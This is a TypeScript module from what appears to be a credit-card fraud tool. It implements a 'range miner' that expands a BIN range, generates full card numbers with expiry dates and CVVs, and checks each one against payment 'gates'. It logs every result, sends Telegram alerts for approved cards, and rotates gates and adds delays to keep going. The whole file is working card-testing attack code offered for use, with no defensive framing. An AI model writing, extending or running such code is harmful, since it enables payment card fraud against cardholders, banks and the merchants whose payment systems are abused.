import { storage } from "./storage";
import { generateCardsFiltered, expandBinRange, type CardTypeFilter } from "./card-generator";
import { runGateCheck } from "./checker";
import { log } from "./index";

export type RangeMinerApprovedFn = (
  card: string,
  result: { status: string; response: string; latency: number },
  gateName: string,
  gateId: string,
) => void;

export interface RangeMinerConfig {
  /** BIN range: start and end (4-16 digits each) */
  startBin: string;
  endBin: string;
  /** Optional: individual BINs added on top of range */
  extraBins: string[];
  /** Fixed expiry month (01-12) or "random" */
  month: string;
  /** Fixed expiry year (2024-2030) or "random" */
  year: string;
  /** Card type filter */
  typeFilter: CardTypeFilter;
  /** Gate ID or "random" */
  gateId: string;
  /** Delay between checks in seconds */
  delaySecs: number;
  /** Max cards to check per BIN */
  maxCardsPerBin: number;
  /** Send Telegram notification on approved */
  notifyEnabled: boolean;
}

let rangeMinerJob: { stop: () => void } | null = null;

export function isRangeMinerRunning(): boolean { return rangeMinerJob !== null; }

export async function resetRangeMinerState(): Promise<void> {
  rangeMinerJob = null;
}

async function resolveGate(gateId: string): Promise<any | null> {
  if (gateId === "random") {
    const allGates = await storage.getGateConfigs();
    const active = allGates.filter((g: any) => g.active);
    if (active.length === 0) return null;
    return active[Math.floor(Math.random() * active.length)];
  }
  return storage.getGateConfig(gateId);
}

function pause(ms: number): Promise<void> {
  return new Promise(r => setTimeout(r, ms));
}

/**
 * Start the range-based CC miner.
 * Generates cards from a BIN range, filters by type, checks through a gate.
 */
export async function startRangeMiner(
  config: RangeMinerConfig,
  onApproved: RangeMinerApprovedFn,
): Promise<{ ok: boolean; reason?: string }> {
  if (rangeMinerJob) return { ok: false, reason: "already_running" };

  // Validate gate
  const gate = await resolveGate(config.gateId);
  if (!gate) return { ok: false, reason: "gate_not_found" };
  if (config.gateId !== "random" && !gate.active) return { ok: false, reason: "gate_inactive" };

  // Expand BIN range
  const rangeBins = expandBinRange(config.startBin, config.endBin);
  const allBins = [...rangeBins, ...config.extraBins];
  if (allBins.length === 0) return { ok: false, reason: "no_bins" };

  // Cap total BINs
  const effectiveBins = allBins.slice(0, 500);

  const jobRef = { running: true };
  rangeMinerJob = { stop: () => { jobRef.running = false; } };

  log(`[RANGE-MINER] Starting — ${effectiveBins.length} BINs (${config.startBin}→${config.endBin}), gate: ${gate.name}, type: ${config.typeFilter}`, "miner");

  (async () => {
    let binIdx = 0;
    let cardsFromBin = 0;
    let totalTried = 0;
    let totalApproved = 0;
    let totalSkipped = 0;
    const delayMs = config.delaySecs * 1000;

    while (jobRef.running) {
      try {
        const bin = effectiveBins[binIdx % effectiveBins.length];
        if (!bin) { binIdx = 0; cardsFromBin = 0; continue; }

        // Resolve gate each iteration (supports random rotation)
        const currentGate = config.gateId === "random"
          ? await resolveGate("random")
          : gate;
        if (!currentGate) { await pause(2000); continue; }

        // Generate 1 card with type filter
        const [gen] = generateCardsFiltered(bin, 1, {
          month: config.month,
          year: config.year,
          typeFilter: config.typeFilter,
        });
        const cardFull = `${gen.number}|${gen.expiryMonth}|${gen.expiryYear}|${gen.cvv}`;

        // Check card
        const result = await runGateCheck(cardFull, currentGate, true);

        totalTried++;
        if (result.status === "approved") totalApproved++;

        // Save result
        await storage.createCheckResult({
          card: cardFull,
          status: result.status,
          response: result.response,
          gate: currentGate.name,
          latency: result.latency,
          checkedBy: "range-miner",
        });

        // Notify on approved
        if (result.status === "approved" && config.notifyEnabled) {
          onApproved(cardFull, result, currentGate.name, currentGate.id);
        }

        // Log progress every 10 cards
        if (totalTried % 10 === 0) {
          log(`[RANGE-MINER] Progress: ${totalTried} tried, ${totalApproved} approved, BIN ${binIdx + 1}/${effectiveBins.length}`, "miner");
        }

        cardsFromBin++;
        if (cardsFromBin >= config.maxCardsPerBin) {
          binIdx++;
          cardsFromBin = 0;
          // Completed full cycle
          if (binIdx >= effectiveBins.length) {
            log(`[RANGE-MINER] Cycle complete — ${totalTried} tried, ${totalApproved} approved`, "miner");
            binIdx = 0;
            cardsFromBin = 0;
          }
        }
      } catch (err: any) {
        log(`[RANGE-MINER] ${err.message}`, "miner");
      }

      if (jobRef.running) await pause(delayMs);
    }

    rangeMinerJob = null;
    log(`[RANGE-MINER] Stopped — ${totalTried} tried, ${totalApproved} approved`, "miner");
  })().catch(async (err: any) => {
    log(`[RANGE-MINER CRASH] ${err.message}`, "miner");
    rangeMinerJob = null;
  });

  return { ok: true };
}

export async function stopRangeMiner(): Promise<void> {
  if (rangeMinerJob) { rangeMinerJob.stop(); rangeMinerJob = null; }
}
